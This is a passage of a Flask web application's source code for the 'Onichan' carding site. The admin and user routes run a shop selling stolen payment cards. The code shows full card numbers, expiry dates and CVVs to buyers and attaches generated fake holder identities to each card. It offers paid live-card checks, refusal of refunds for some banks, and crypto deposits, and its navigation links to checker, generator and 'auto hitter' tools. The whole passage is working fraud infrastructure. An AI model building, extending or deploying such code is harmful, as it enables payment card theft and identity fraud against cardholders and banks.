    card_ids = request.form.getlist('card_ids')
    action = request.form.get('action', '')
    try:
        card_ids = [int(i) for i in card_ids]
    except:
        card_ids = []
    if card_ids:
        if action == 'delete':
            delete_cards(card_ids)
        elif action == 'remove':
            remove_cards(card_ids)
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/card-price', methods=['POST'])
@admin_required
def admin_ccshop_card_price():
    try:
        card_id = int(request.form.get('card_id', 0))
        price = float(request.form.get('price', 0))
        if card_id and price > 0:
            update_card_price(card_id, price)
    except:
        pass
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/set-profit', methods=['POST'])
@admin_required
def admin_ccshop_set_profit():
    try:
        profit = float(request.form.get('profit', 0))
        profit = max(0, min(100, profit))
        set_profit_percentage(profit)
    except:
        pass
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/set-refund-window', methods=['POST'])
@admin_required
def admin_ccshop_set_refund_window():
    try:
        minutes = int(request.form.get('minutes', 5))
        minutes = max(1, min(1440, minutes))
        set_refund_window_minutes(minutes)
    except:
        pass
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/add-blocked-bank', methods=['POST'])
@admin_required
def admin_ccshop_add_blocked_bank():
    bank = request.form.get('bank', '').strip()
    if bank:
        add_non_refundable_bank(bank)
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/remove-blocked-bank', methods=['POST'])
@admin_required
def admin_ccshop_remove_blocked_bank():
    bank = request.form.get('bank', '').strip()
    if bank:
        remove_non_refundable_bank(bank)
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/bin-price', methods=['POST'])
@admin_required
def admin_ccshop_bin_price():
    try:
        target = request.form.get('target', '')
        target_type = request.form.get('target_type', 'bin')
        price = float(request.form.get('price', 0))
        if target and price > 0:
            if target_type == 'bin':
                update_bin_price(target, price)
            elif target_type == 'country':
                update_country_price(target, price)
            elif target_type == 'brand':
                update_brand_price(target, price)
    except:
        pass
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/add-price-rule', methods=['POST'])
@admin_required
def admin_add_price_rule():
    try:
        rule_type = request.form.get('rule_type', 'bin')
        target = request.form.get('target', '').strip()
        price = float(request.form.get('price', 0))
        if target and price > 0 and rule_type in ('bin', 'country', 'brand'):
            add_price_rule(rule_type, target, price)
    except:
        pass
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/remove-price-rule', methods=['POST'])
@admin_required
def admin_remove_price_rule():
    try:
        rule_id = int(request.form.get('rule_id', 0))
        if rule_id > 0:
            remove_price_rule(rule_id)
    except:
        pass
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/apply-price-rules', methods=['POST'])
@admin_required
def admin_apply_price_rules():
    try:
        apply_price_rules_to_stock()
    except:
        pass
    return redirect('/admin/ccshop')

@app.route('/admin/ccshop/purchases')
@admin_required
def admin_ccshop_purchases():
    page = request.args.get('page', 1, type=int)
    data = get_purchase_history(page=page, per_page=50)

    rows_html = ""
    for p in data['purchases']:
        rows_html += f"""<tr>
            <td>{p.get('id','')}</td>
            <td>{_h(str(p.get('user_id','')))}</td>
            <td>{_h(str(p.get('bin6','')))}</td>
            <td>{_h(str(p.get('country','')))} - {_h(str(p.get('brand','')))}</td>
            <td>${float(p.get('price',0)):.2f}</td>
            <td>{str(p.get('purchased_at',''))[:16]}</td>
        </tr>"""

    pagination = ""
    if data['pages'] > 1:
        for p in range(1, data['pages'] + 1):
            active = 'style="background:#e94560;color:#fff;"' if p == page else ''
            pagination += f'<a href="/admin/ccshop/purchases?page={p}" class="btn btn-sm" {active}>{p}</a> '

    return render_template_string(f"""
    <html>
    <head><title>Purchase History - Admin</title>{ADMIN_CSS}</head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()"><span></span><span></span><span></span></button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <div class="sidebar">
            <h2>Onichan Admin</h2>
            <a href="/admin" onclick="closeSidebar()">Dashboard</a>
            <a href="/admin/users" onclick="closeSidebar()">Users</a>
            <a href="/admin/owners" onclick="closeSidebar()">Admins</a>
            <a href="/admin/permissions" onclick="closeSidebar()">Permissions</a>
            <a href="/admin/premium" onclick="closeSidebar()">Premium</a>
            <a href="/admin/payments" onclick="closeSidebar()">Payments</a>
            <a href="/admin/banned" onclick="closeSidebar()">Banned</a>
            <a href="/admin/cards" onclick="closeSidebar()">Approved Cards</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/tools/checker" onclick="closeSidebar()">CC Checker</a>
            <a href="/tools/generator" onclick="closeSidebar()">Generator</a>
            <a href="/admin/autohitter" onclick="closeSidebar()">Auto Hitter</a>
            <a href="/tools/cleaner" onclick="closeSidebar()">CC Cleaner</a>
            <hr style="border-color: rgba(255,255,255,0.1); margin: 10px 0;">
            <a href="/admin/ccshop" class="active" onclick="closeSidebar()">CC Shop</a>
            <a href="/admin/gates" onclick="closeSidebar()">Gates</a>
            <a href="/admin/settings" onclick="closeSidebar()">Settings</a>
            <a href="/admin/logout" onclick="closeSidebar()">Logout</a>
        </div>
        <div class="main">
            <div class="header"><h1>Purchase History</h1><a href="/admin/ccshop" class="btn btn-primary" style="text-decoration:none;">Back to Shop</a></div>
            <div class="card">
                <table>
                    <tr><th>ID</th><th>User ID</th><th>BIN</th><th>Details</th><th>Price</th><th>Date</th></tr>
                    {rows_html if rows_html else '<tr><td colspan="6">No purchases yet</td></tr>'}
                </table>
                <div style="margin-top:15px;display:flex;gap:5px;">{pagination}</div>
            </div>
        </div>
        <script>
        function toggleSidebar(){{document.querySelector('.sidebar').classList.toggle('open');document.querySelector('.sidebar-overlay').classList.toggle('open');}}
        function closeSidebar(){{document.querySelector('.sidebar').classList.remove('open');document.querySelector('.sidebar-overlay').classList.remove('open');}}
        </script>
    </body>
    </html>
    """)


# ─── CC SHOP USER ROUTES ────────────────────────────────────────────────────

@app.route('/user/ccshop')
@user_required
def user_ccshop():
    user_id = session.get('user_id')
    balance = get_user_balance(user_id)
    page = request.args.get('page', 1, type=int)
    country = request.args.get('country', '')
    brand = request.args.get('brand', '')
    card_type = request.args.get('type', '')
    bank = request.args.get('bank', '')
    bin_prefix = request.args.get('bin', '')

    stock = get_available_cards(
        country=country, brand=brand, card_type=card_type,
        bank=bank, bin_prefix=bin_prefix, page=page, per_page=30
    )
    filters = get_filter_options()

    country_options = ''.join([f'<option value="{_h(c["name"])}" {"selected" if c["name"].lower()==country.lower() else ""}>{_h(c["name"])} ({_h(c["code"])})</option>' for c in filters['countries']])
    brand_options = ''.join([f'<option value="{_h(b)}" {"selected" if b.lower()==brand.lower() else ""}>{_h(b)}</option>' for b in filters['brands']])
    type_options = ''.join([f'<option value="{_h(t)}" {"selected" if t.lower()==card_type.lower() else ""}>{_h(t)}</option>' for t in filters['types']])

    cards_html = ""
    for c in stock['cards']:
        from modules.bin_lookup import _flag
        flag = _flag(c.get('country_code', ''))
        cards_html += f"""
        <div class="shop-card">
            <div class="shop-card-header">
                <span class="shop-bin">{_h(c.get('bin6',''))}</span>
                <span class="shop-price">${float(c.get('price',0)):.2f}</span>
            </div>
            <div class="shop-card-body">
                <div class="shop-info"><span class="label">Country</span><span>{flag} {_h(c.get('country',''))} ({_h(c.get('country_code',''))})</span></div>
                <div class="shop-info"><span class="label">Brand</span><span>{_h(c.get('brand',''))}</span></div>
                <div class="shop-info"><span class="label">Type</span><span>{_h(c.get('card_type',''))}</span></div>
                <div class="shop-info"><span class="label">Level</span><span>{_h(c.get('card_level','') or '-')}</span></div>
                <div class="shop-info"><span class="label">Bank</span><span>{_h((c.get('bank','') or '')[:25])}</span></div>
            </div>
            <form method="POST" action="/user/ccshop/buy">
                <input type="hidden" name="card_id" value="{c['id']}">
                <button type="submit" class="shop-buy-btn">Buy</button>
            </form>
        </div>"""

    pagination = ""
    if stock['pages'] > 1:
        for p in range(1, stock['pages'] + 1):
            active = 'background:#ff1493;color:#fff;' if p == page else ''
            pagination += f'<a href="/user/ccshop?page={p}&country={_h(country)}&brand={_h(brand)}&type={_h(card_type)}&bank={_h(bank)}&bin={_h(bin_prefix)}" class="btn btn-sm" style="padding:5px 12px;margin:2px;border-radius:6px;text-decoration:none;{active}">{p}</a>'

    return render_template_string(f"""
    <html>
    <head><title>CC Shop - Onichan</title>{USER_CSS}
    <style>
        .balance-bar {{
            background: linear-gradient(135deg, rgba(255,20,147,0.2), rgba(218,112,214,0.2));
            border: 1px solid rgba(255,105,180,0.3);
            border-radius: 12px;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }}
        .balance-amount {{
            font-size: 1.5em;
            font-weight: 700;
            color: #ff69b4;
        }}
        .shop-filters {{
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }}
        .shop-filters select, .shop-filters input {{
            padding: 8px 12px;
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,105,180,0.3);
            border-radius: 8px;
            color: #fff;
            font-size: 0.9em;
        }}
        .shop-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 15px;
        }}
        .shop-card {{
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,105,180,0.2);
            border-radius: 12px;
            padding: 15px;
            transition: all 0.3s ease;
        }}
        .shop-card:hover {{
            border-color: rgba(255,105,180,0.5);
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(255,20,147,0.15);
        }}
        .shop-card-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }}
        .shop-bin {{
            font-family: monospace;
            font-size: 1.1em;
            font-weight: 700;
            color: #ff69b4;
        }}
        .shop-price {{
            font-size: 1.2em;
            font-weight: 700;
            color: #4ade80;
        }}
        .shop-card-body {{
            margin-bottom: 12px;
        }}
        .shop-info {{
            display: flex;
            justify-content: space-between;
            padding: 3px 0;
            font-size: 0.85em;
        }}
        .shop-info .label {{
            opacity: 0.6;
        }}
        .shop-buy-btn {{
            width: 100%;
            padding: 10px;
            background: linear-gradient(135deg, #ff1493, #ff69b4);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
            font-size: 0.95em;
            transition: all 0.3s ease;
        }}
        .shop-buy-btn:hover {{
            transform: scale(1.02);
            box-shadow: 0 4px 15px rgba(255,20,147,0.4);
        }}
    </style>
    </head>
    <body>
        {get_user_sidebar('ccshop', 'CC Shop')}
        <div class="main">
            <div class="header"><h1>CC Shop</h1></div>
            <div class="balance-bar">
                <span>Your Balance</span>
                <span class="balance-amount">${balance:.2f}</span>
                <a href="/user/ccshop/deposit" style="margin-left:15px;padding:6px 16px;background:linear-gradient(135deg,#ff69b4,#ff1493);border-radius:8px;color:#fff;text-decoration:none;font-size:0.85em;font-weight:600;">+ Add Funds</a>
            </div>

            <form method="GET" action="/user/ccshop" class="shop-filters">
                <select name="country"><option value="">All Countries</option>{country_options}</select>
                <select name="brand"><option value="">All Brands</option>{brand_options}</select>
                <select name="type"><option value="">All Types</option>{type_options}</select>
                <input type="text" name="bin" value="{_h(bin_prefix)}" placeholder="BIN prefix...">
                <button type="submit" class="btn btn-primary" style="padding:8px 20px;background:#ff1493;border:none;border-radius:8px;color:#fff;cursor:pointer;">Filter</button>
            </form>

            <p style="opacity:0.7;margin-bottom:10px;">{stock['total']} cards available</p>

            <div class="shop-grid">
                {cards_html if cards_html else '<p style="text-align:center;opacity:0.5;grid-column:1/-1;">No cards available matching your filters</p>'}
            </div>
            <div style="margin-top:20px;display:flex;gap:5px;flex-wrap:wrap;justify-content:center;">{pagination}</div>
        </div>
    </body>
    </html>
    """)

@app.route('/user/ccshop/buy', methods=['POST'])
@user_required
def user_ccshop_buy():
    user_id = session.get('user_id')
    card_id = request.form.get('card_id', 0, type=int)
    if not card_id:
        return redirect('/user/ccshop')

    from modules.cc_shop import purchase_card as shop_purchase
    from modules.fake_identity import generate_holder_info as gen_holder
    from modules.database import _execute_with_retry as _db_exec

    card_info = _db_exec(
        "SELECT country, country_code FROM cc_shop_stock WHERE id = %s",
        (card_id,), fetch_one=True
    )
    holder = gen_holder(
        country_name=card_info.get('country', '') if card_info else '',
        country_code=card_info.get('country_code', '') if card_info else ''
    )

    result = shop_purchase(user_id, card_id, holder)
    if result.get('error'):
        return render_template_string(f"""
        <html>
        <head><title>Purchase Failed</title>{USER_CSS}</head>
        <body>
            {get_user_sidebar('ccshop', 'CC Shop')}
            <div class="main">
                <div class="card" style="text-align:center;padding:40px;">
                    <h2 style="color:#ef4444;margin-bottom:15px;">Purchase Failed</h2>
                    <p>{result['error']}</p>
                    <a href="/user/ccshop" class="btn btn-primary" style="display:inline-block;margin-top:20px;text-decoration:none;padding:10px 25px;background:#ff1493;border-radius:8px;color:#fff;">Back to Shop</a>
                </div>
            </div>
        </body>
        </html>
        """)

    card = result['card']
    cc_full = f"{card['cc_number']}|{card['mm']}|{card['yy']}|{card['cvv']}"
    return render_template_string(f"""
    <html>
    <head><title>Purchase Success!</title>{USER_CSS}
    <style>
        .reveal-card {{
            background: linear-gradient(135deg, rgba(255,20,147,0.15), rgba(74,222,128,0.1));
            border: 2px solid rgba(74,222,128,0.4);
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 20px;
        }}
        .cc-reveal {{
            font-family: monospace;
            font-size: 1.3em;
            background: rgba(0,0,0,0.3);
            padding: 12px 18px;
            border-radius: 8px;
            margin: 10px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}
        .copy-btn {{
            background: #ff69b4;
            border: none;
            padding: 6px 14px;
            border-radius: 6px;
            color: #fff;
            cursor: pointer;
            font-size: 0.8em;
        }}
        .holder-info {{
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            padding: 20px;
        }}
        .holder-row {{
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }}
        .holder-row:last-child {{ border-bottom: none; }}
    </style>
    </head>
    <body>
        {get_user_sidebar('ccshop', 'CC Shop')}
        <div class="main">
            <div class="header"><h1>Purchase Successful!</h1></div>
            <div class="reveal-card">
                <h2 style="color:#4ade80;margin-bottom:15px;">Card Purchased</h2>
                <div class="cc-reveal">
                    <code id="ccData">{cc_full}</code>
                    <button class="copy-btn" onclick="copyCC()">Copy</button>
                </div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px;font-size:0.9em;">
                    <div><span style="opacity:0.6;">BIN:</span> {card.get('bin6','')}</div>
                    <div><span style="opacity:0.6;">Brand:</span> {card.get('brand','')}</div>
                    <div><span style="opacity:0.6;">Country:</span> {card.get('country','')} ({card.get('country_code','')})</div>
                    <div><span style="opacity:0.6;">Type:</span> {card.get('card_type','')}</div>
                    <div><span style="opacity:0.6;">Bank:</span> {card.get('bank','')}</div>
                    <div><span style="opacity:0.6;">Price:</span> ${result['price']:.2f}</div>
                </div>
                <p style="margin-top:10px;color:#4ade80;">New Balance: ${result['new_balance']:.2f}</p>
            </div>

            <div class="holder-info">
                <h3 style="color:#ff69b4;margin-bottom:15px;">Holder Info</h3>
                <div class="holder-row"><span style="opacity:0.6;">Name</span><span id="hName">{holder['name']}</span></div>
                <div class="holder-row"><span style="opacity:0.6;">Email</span><span id="hEmail">{holder['email']}</span></div>
                <div class="holder-row"><span style="opacity:0.6;">Phone</span><span id="hPhone">{holder['phone']}</span></div>
                <div class="holder-row"><span style="opacity:0.6;">Address</span><span id="hAddr">{holder['address']}</span></div>
                <button class="copy-btn" style="margin-top:12px;" onclick="copyHolder()">Copy All Info</button>
            </div>

            <div style="display:flex;gap:10px;margin-top:20px;">
                <a href="/user/ccshop" style="text-decoration:none;padding:10px 25px;background:#ff1493;border-radius:8px;color:#fff;">Continue Shopping</a>
                <a href="/user/purchased" style="text-decoration:none;padding:10px 25px;background:rgba(255,255,255,0.1);border-radius:8px;color:#fff;">My Purchases</a>
            </div>
        </div>
        <script>
        function copyCC(){{navigator.clipboard.writeText(document.getElementById('ccData').textContent);alert('CC copied!');}}
        function copyHolder(){{
            let t=`Name: ${{document.getElementById('hName').textContent}}\\nEmail: ${{document.getElementById('hEmail').textContent}}\\nPhone: ${{document.getElementById('hPhone').textContent}}\\nAddress: ${{document.getElementById('hAddr').textContent}}`;
            navigator.clipboard.writeText(t);alert('Holder info copied!');
        }}
        </script>
    </body>
    </html>
    """)


@app.route('/user/purchased')
@user_required
def user_purchased():
    from datetime import datetime, timezone as _tz
    user_id = session.get('user_id')
    page = request.args.get('page', 1, type=int)
    data = get_purchased_cards(user_id, page=page, per_page=20)
    refund_window = get_refund_window_minutes()
    now_utc = datetime.now(_tz.utc)

    from modules.bin_lookup import _flag
    cards_html = ""
    for c in data['cards']:
        cc_full = f"{c['cc_number']}|{c['mm']}|{c['yy']}|{c['cvv']}"
        flag = _flag(c.get('country_code', ''))
        bank_name = c.get('bank', '') or ''
        bank_blocked = is_bank_non_refundable(bank_name)
        already_refunded = c.get('refunded', False)
        denial_reason = c.get('refund_denial_reason', '') or ''

        purchased_at = c.get('purchased_at')
        window_expired = False
        time_left_str = ''
        if purchased_at:
            pa = purchased_at
            if pa.tzinfo is None:
                from datetime import timezone as _tz2
                pa = pa.replace(tzinfo=_tz2.utc)
            elapsed = (now_utc - pa).total_seconds()
            remaining = (refund_window * 60) - elapsed
            if remaining <= 0:
                window_expired = True
                time_left_str = 'Expired'
            else:
                mins_left = int(remaining // 60)
                secs_left = int(remaining % 60)
                time_left_str = f'{mins_left}m {secs_left}s left'

        refund_badge = ''
        if bank_blocked:
            refund_badge = '<span style="background:rgba(239,68,68,0.2);color:#ef4444;padding:2px 8px;border-radius:4px;font-size:0.75em;font-weight:700;">NO REFUND</span>'
        elif already_refunded and denial_reason == 'non_refundable_bank':
            refund_badge = '<span style="background:rgba(239,68,68,0.2);color:#ef4444;padding:2px 8px;border-radius:4px;font-size:0.75em;font-weight:700;">NON-REFUNDABLE</span>'
        elif already_refunded and denial_reason == 'window_expired':
            refund_badge = '<span style="background:rgba(251,191,36,0.2);color:#fbbf24;padding:2px 8px;border-radius:4px;font-size:0.75em;font-weight:700;">WINDOW EXPIRED</span>'
        elif already_refunded:
            refund_badge = '<span style="background:rgba(34,197,94,0.2);color:#22c55e;padding:2px 8px;border-radius:4px;font-size:0.75em;font-weight:700;">REFUNDED</span>'

        refund_timer = ''
        if not already_refunded and not bank_blocked:
            if window_expired:
                refund_timer = '<div style="font-size:0.75em;color:#ef4444;margin-top:4px;">Refund window expired</div>'
            else:
                refund_timer = f'<div style="font-size:0.75em;color:#22c55e;margin-top:4px;">Refund: {time_left_str}</div>'

        check_style = 'background:linear-gradient(135deg,#6366f1,#8b5cf6);cursor:pointer;'
        check_label = 'Check Card ($0.20)'
        if already_refunded:
            check_style = 'background:#555;cursor:pointer;opacity:0.7;'
            if denial_reason == 'non_refundable_bank':
                check_label = 'Check (No Refund) $0.20'
            elif denial_reason == 'window_expired':
                check_label = 'Check (Expired) $0.20'
            else:
                check_label = 'Already Checked ($0.20)'

        cards_html += f"""
        <div class="purchased-card">
            <div class="purchased-header">
                <span class="shop-bin">{_h(c.get('bin6',''))}</span>
                <div style="display:flex;gap:6px;align-items:center;">
                    {refund_badge}
                    <span style="font-size:0.8em;opacity:0.6;">{str(c.get('purchased_at',''))[:16]}</span>
                </div>
            </div>
            <div class="cc-reveal" style="font-size:1em;">
                <code class="cc-text">{_h(cc_full)}</code>
                <button class="copy-btn" onclick="navigator.clipboard.writeText('{_h(cc_full)}');this.textContent='Copied!';setTimeout(()=>this.textContent='Copy',1500);">Copy</button>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:5px;font-size:0.85em;margin:10px 0;">
                <div><span style="opacity:0.6;">Country:</span> {flag} {_h(c.get('country',''))} ({_h(c.get('country_code',''))})</div>
                <div><span style="opacity:0.6;">Brand:</span> {_h(c.get('brand',''))}</div>
                <div><span style="opacity:0.6;">Type:</span> {_h(c.get('card_type',''))}</div>
                <div><span style="opacity:0.6;">Bank:</span> {_h(bank_name[:25])}</div>
                <div><span style="opacity:0.6;">Price:</span> ${float(c.get('price',0)):.2f}</div>
            </div>
            {refund_timer}
            <div class="holder-info" style="margin-top:10px;padding:12px;font-size:0.85em;">
                <div class="holder-row"><span style="opacity:0.6;">Name</span><span>{_h(c.get('holder_name','N/A'))}</span></div>
                <div class="holder-row"><span style="opacity:0.6;">Email</span><span>{_h(c.get('holder_email','N/A'))}</span></div>
                <div class="holder-row"><span style="opacity:0.6;">Phone</span><span>{_h(c.get('holder_phone','N/A'))}</span></div>
                <div class="holder-row"><span style="opacity:0.6;">Address</span><span>{_h(c.get('holder_address','N/A'))}</span></div>
            </div>
            <button class="check-btn" onclick="checkCard(this, {c.get('id',0)})" style="margin-top:10px;width:100%;padding:8px;{check_style}border:none;border-radius:8px;color:#fff;font-weight:600;">{check_label}</button>
        </div>"""

    pagination = ""
    if data['pages'] > 1:
        for p in range(1, data['pages'] + 1):
            active = 'background:#ff1493;color:#fff;' if p == page else ''
            pagination += f'<a href="/user/purchased?page={p}" class="btn btn-sm" style="padding:5px 12px;margin:2px;border-radius:6px;text-decoration:none;{active}">{p}</a>'

    return render_template_string(f"""
    <html>
    <head><title>My Purchases - Onichan</title>{USER_CSS}
    <style>
        .purchased-card {{
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,105,180,0.2);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 15px;
        }}
        .purchased-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }}
        .shop-bin {{ font-family: monospace; font-size: 1.1em; font-weight: 700; color: #ff69b4; }}
        .cc-reveal {{
            font-family: monospace;
            background: rgba(0,0,0,0.3);
            padding: 10px 14px;
            border-radius: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}
        .copy-btn {{
            background: #ff69b4;
            border: none;
            padding: 5px 12px;
            border-radius: 6px;
            color: #fff;
            cursor: pointer;
            font-size: 0.8em;
        }}
        .holder-info {{
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 8px;
        }}
        .holder-row {{
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }}
        .holder-row:last-child {{ border-bottom: none; }}
    </style>
    </head>
    <body>
        {get_user_sidebar('purchased', 'My Purchases')}
        <div class="main">
            <div class="header"><h1>My Purchases</h1><span style="opacity:0.7;">{data['total']} cards purchased</span></div>
            {cards_html if cards_html else '<div class="card" style="text-align:center;padding:40px;"><p style="opacity:0.5;">No purchases yet</p><a href="/user/ccshop" style="text-decoration:none;padding:10px 25px;background:#ff1493;border-radius:8px;color:#fff;display:inline-block;margin-top:15px;">Browse Shop</a></div>'}
            <div style="margin-top:15px;display:flex;gap:5px;flex-wrap:wrap;justify-content:center;">{pagination}</div>
        </div>
        <script>
        function checkCard(btn, purchaseId) {{
            btn.disabled = true;
            btn.textContent = 'Checking...';
            btn.style.opacity = '0.6';
            fetch('/api/shop/check', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{purchase_id:purchaseId}}) }})
            .then(r => r.json())
            .then(d => {{
                btn.style.opacity = '1';
                if (d.status === 'live') {{
                    btn.textContent = 'LIVE ✓';
                    btn.style.background = 'linear-gradient(135deg,#22c55e,#16a34a)';
                }} else if (d.status === 'dead') {{
                    var msg = d.message || 'DEAD';
                    btn.textContent = msg;
                    btn.style.background = 'linear-gradient(135deg,#ef4444,#dc2626)';
                    btn.style.fontSize = '0.8em';
                }} else {{
                    btn.textContent = d.message || 'Error';
                    btn.style.background = '#666';
                }}
                setTimeout(() => {{ btn.disabled = false; btn.textContent = 'Check Again'; btn.style.background = 'linear-gradient(135deg,#6366f1,#8b5cf6)'; btn.style.fontSize = ''; }}, 10000);
            }})
            .catch(() => {{ btn.disabled = false; btn.textContent = 'Check Card'; btn.style.opacity = '1'; }});
        }}
        </script>
    </body>
    </html>
    """)


# ─── CC SHOP DEPOSIT (OxaPay) ─────────────────────────────────────────────

@app.route('/user/ccshop/deposit')
@user_required
def user_ccshop_deposit():
    user_id = session.get('user_id')
    username = session.get('username', '')
    balance = get_user_balance(user_id)
    return render_template_string(f"""
    <!DOCTYPE html>
    <html><head>
    <title>Deposit - CC Shop</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ background:#0d0d1a; color:#fff; font-family:'Segoe UI',sans-serif; padding:20px; }}
        .container {{ max-width:500px; margin:40px auto; }}
        .card {{ background:rgba(255,255,255,0.05); border-radius:16px; padding:25px; margin-bottom:20px; border:1px solid rgba(255,255,255,0.08); }}
        h1 {{ color:#ff69b4; font-size:1.5em; margin-bottom:5px; }}
        .balance {{ color:#da70d6; font-size:1.2em; margin-bottom:20px; }}
        label {{ display:block; margin-bottom:6px; opacity:0.7; font-size:0.9em; }}
        input, select {{ width:100%; padding:12px; background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.15); border-radius:10px; color:#fff; font-size:1em; margin-bottom:15px; }}
        .btn {{ display:inline-block; padding:12px 30px; background:linear-gradient(135deg,#ff69b4,#ff1493); color:#fff; border:none; border-radius:10px; cursor:pointer; font-size:1em; font-weight:600; text-decoration:none; }}
        .btn:hover {{ opacity:0.9; }}
        .back {{ display:inline-block; margin-top:15px; color:#ff69b4; text-decoration:none; }}
        .amounts {{ display:flex; gap:8px; flex-wrap:wrap; margin-bottom:15px; }}
        .amt-btn {{ padding:8px 16px; background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); border-radius:8px; color:#fff; cursor:pointer; font-size:0.9em; }}
        .amt-btn:hover {{ background:rgba(255,105,180,0.3); border-color:#ff69b4; }}
    </style>
    </head><body>
    <div class="container">
        <div class="card">
            <h1>💳 Add Balance</h1>
            <p class="balance">Current Balance: <strong>${balance:.2f}</strong></p>
            <form method="POST" action="/user/ccshop/deposit/create">
                <label>Amount (USD)</label>
                <div class="amounts">
                    <button type="button" class="amt-btn" onclick="document.getElementById('amt').value='5'">$5</button>
                    <button type="button" class="amt-btn" onclick="document.getElementById('amt').value='10'">$10</button>
                    <button type="button" class="amt-btn" onclick="document.getElementById('amt').value='25'">$25</button>
                    <button type="button" class="amt-btn" onclick="document.getElementById('amt').value='50'">$50</button>
                    <button type="button" class="amt-btn" onclick="document.getElementById('amt').value='100'">$100</button>
                </div>
                <input type="number" id="amt" name="amount" step="0.01" min="1" placeholder="Enter amount" required>
                <button type="submit" class="btn">Create Invoice</button>
            </form>
            <a class="back" href="/user/ccshop">&larr; Back to Shop</a>
        </div>
    </div>
    </body></html>
    """)


@app.route('/user/ccshop/deposit/create', methods=['POST'])
@user_required
def user_ccshop_deposit_create():
    user_id = session.get('user_id')
    username = session.get('username', '')
    amount = request.form.get('amount', '0')
    result = create_shop_deposit_invoice(user_id, username, amount)
    if result.get('error'):
        err_msg = _h(result['error'])
        return f"""
        <!DOCTYPE html><html><head><title>Deposit Error</title>
        <style>* {{ margin:0;padding:0;box-sizing:border-box; }} body {{ background:#0d0d1a;color:#fff;font-family:'Segoe UI',sans-serif;padding:40px;text-align:center; }}
        .card {{ max-width:450px;margin:60px auto;background:rgba(255,255,255,0.05);border-radius:16px;padding:30px;border:1px solid rgba(255,0,0,0.2); }}
        .btn {{ display:inline-block;padding:10px 25px;background:#ff1493;border-radius:10px;color:#fff;text-decoration:none;margin-top:15px; }}</style></head><body>
        <div class="card"><h2 style="color:#ff4444;">❌ Error</h2><p style="margin:15px 0;">{err_msg}</p>
        <a class="btn" href="/user/ccshop/deposit">Try Again</a></div></body></html>
        """

    payment_url = result.get('payment_url', '')
    amt = float(result.get('amount', 0))
    track = result.get('track_id', '')
    amt_str = f"${amt:.2f}"
    return f"""
    <!DOCTYPE html><html><head><title>Pay Invoice</title>
    <style>* {{ margin:0;padding:0;box-sizing:border-box; }} body {{ background:#0d0d1a;color:#fff;font-family:'Segoe UI',sans-serif;padding:40px;text-align:center; }}
    .card {{ max-width:500px;margin:60px auto;background:rgba(255,255,255,0.05);border-radius:16px;padding:30px;border:1px solid rgba(255,105,180,0.2); }}
    .btn {{ display:inline-block;padding:12px 30px;background:linear-gradient(135deg,#ff69b4,#ff1493);border-radius:10px;color:#fff;text-decoration:none;font-weight:600;font-size:1.1em; }}
    .btn:hover {{ opacity:0.9; }}
    .info {{ opacity:0.6;font-size:0.9em;margin:10px 0; }}
    .back {{ display:inline-block;margin-top:15px;color:#ff69b4;text-decoration:none; }}</style></head><body>
    <div class="card">
        <h2 style="color:#ff69b4;">✅ Invoice Created</h2>
        <p style="margin:15px 0;font-size:1.2em;">Amount: <strong>{amt_str}</strong></p>
        <p class="info">Track ID: {_h(track)}</p>
        <a class="btn" href="{_h(payment_url)}" target="_blank">💰 Pay Now</a>
        <p class="info" style="margin-top:20px;">Your balance will be credited automatically once payment is confirmed.</p>
        <a class="back" href="/user/ccshop/deposit">&larr; Back to Deposit</a>
    </div></body></html>
    """


@app.route('/api/shop/deposit/callback', methods=['POST'])
def shop_deposit_callback():
    data = request.get_json(silent=True) or request.form.to_dict()
    status = str(data.get('status', '') or data.get('state', '')).lower()
    track_id = data.get('trackId') or data.get('track_id') or data.get('id', '')
    if not track_id:
        return jsonify({'status': 'error', 'message': 'No track ID'}), 400

    if status in ('paid', 'confirmed', 'complete', 'completed', 'sending'):
        from modules.database import _execute_with_retry
        dep = _execute_with_retry(
            "SELECT * FROM cc_shop_deposits WHERE track_id = %s AND status = 'pending'",
            (str(track_id),), fetch_one=True
        )
